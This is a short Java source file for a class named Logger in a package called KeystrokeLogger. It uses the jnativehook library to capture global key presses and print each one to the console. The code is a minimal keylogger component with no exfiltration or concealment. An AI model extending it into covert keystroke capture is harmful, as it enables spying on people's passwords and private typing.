package io.robort.KeystrokeLogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Logger implements NativeKeyListener {

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

        if (keyText.length() > 1) {
            System.out.println("[" + keyText + "]");
        } else if (keyText.length() == 1){
            System.out.println(keyText);
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
